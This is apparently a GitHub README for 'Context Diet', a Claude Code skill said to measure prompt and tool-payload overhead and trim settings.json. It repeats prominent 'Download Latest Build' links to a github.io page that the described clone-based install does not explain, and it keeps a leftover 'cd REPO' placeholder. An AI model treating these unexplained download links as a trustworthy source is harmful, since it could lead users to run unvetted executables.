# Context Diet - Claude Code Optimization Skill 2026

> **Context Diet is a Claude Code agent skill for measuring system-prompt overhead, reviewing tool payload size, and reducing unused definitions through controlled `settings.json` configuration.**

[![Platform](https://img.shields.io/badge/Platform-Claude%20Code-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaacross68/context-diet-skill-win-10844?style=flat-square)](https://github.com/isaacross68/context-diet-skill-win-10844)

---

<p align="center">
  <a href="https://isaacross68.github.io/context-diet-skill-win-10844/">
    <img src="https://img.shields.io/badge/Download-Context%20Diet%20Latest-brightgreen?style=for-the-badge" alt="Download Context Diet">
  </a>
</p>

> **[Direct Download - Context Diet](https://isaacross68.github.io/context-diet-skill-win-10844/)**

---

[Download Latest Build](https://isaacross68.github.io/context-diet-skill-win-10844/)

---

## About Context Diet

Context Diet is a Claude Code optimization skill focused on identifying unnecessary system-prompt and tool-definition overhead. It uses a logging proxy to measure payload size and helps determine which tools and features contribute most to the working context.

The skill is intended for developers and teams tuning Claude Code configurations. It supports a measured workflow: inspect current usage, compare tool payloads, and apply targeted settings changes rather than disabling capabilities without review.

---

## Features

- Measures system-prompt bloat through a logging proxy
- Ranks available tools by payload size
- Identifies unused tool definitions and features
- Includes conservative configuration templates
- Includes aggressive configuration templates
- Applies deterministic merges to `settings.json`
- Creates backups before configuration changes
- Supports global, project-level, and dry-run modes

---

## Installation

Clone the repository into a local working directory:

```bash
git clone https://github.com/isaacross68/context-diet-skill-win-10844.git
cd REPO
```

Ensure Node.js is available in your environment. Review the skill files and configuration templates before using the tool with Claude Code.

For an initial evaluation, use dry-run mode where available. This allows configuration changes to be inspected before they are written to a global or project settings file.

---

## Usage

A typical workflow is:

1. Start with the logging proxy to collect information about the current prompt and tool payloads.
2. Review the ranked tool-size results.
3. Identify definitions or features that are not needed for the target project.
4. Select a conservative or aggressive configuration template.
5. Run the configuration process in dry-run mode.
6. Apply the reviewed settings at either the project or global scope.
7. Confirm the resulting `settings.json` and retain the generated backup.

Example workflow:

```text
Measure -> Rank payloads -> Review unused tools -> Preview changes -> Apply settings
```

Use project mode when the configuration should affect one repository. Use global mode when the same settings should apply across Claude Code projects.

---

## Configuration

Context Diet works with Claude Code `settings.json` configuration. Changes are designed to be deterministic and are accompanied by backups when settings are updated.

The available configuration approaches are:

- **Conservative:** reduces selected overhead while retaining more optional functionality.
- **Aggressive:** disables a broader set of unused definitions or features.
- **Dry run:** previews the intended merge without applying it.
- **Project scope:** stores changes for the current project.
- **Global scope:** applies changes to the global Claude Code configuration.

Review each generated change before applying it, especially when switching from project-level testing to global settings.

---

## Requirements

- Claude Code
- Node.js
- Access to the repository files
- A writable Claude Code `settings.json` location for applied changes
- Sufficient storage for configuration backups and local project files

The skill can be evaluated without changing existing settings by using its dry-run workflow.

---

## FAQ

### Who is Context Diet for?

It is designed for Claude Code users who want to inspect system-prompt overhead and tune the set of available tool definitions and features.

### Does it change settings automatically?

It provides deterministic settings merges and backups. Use dry-run mode first to review the proposed result before applying changes.

### Should I use conservative or aggressive configuration?

Start with the conservative template when you want to preserve more functionality. Consider the aggressive template only after reviewing the measured payloads and confirming which capabilities are unnecessary.

### Can configuration be limited to one project?

Yes. Context Diet supports project-level configuration as well as global configuration.

### Where are settings stored?

The skill works with Claude Code `settings.json`. The exact location depends on whether you choose project or global mode.

### How can I troubleshoot a configuration change?

Repeat the operation in dry-run mode, inspect the proposed merge, compare it with the backup, and verify whether the change was intended for the project or global scope.

### How are updates delivered?

Check the repository for newer builds and updated skill files:

[Download Latest Build](https://isaacross68.github.io/context-diet-skill-win-10844/)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
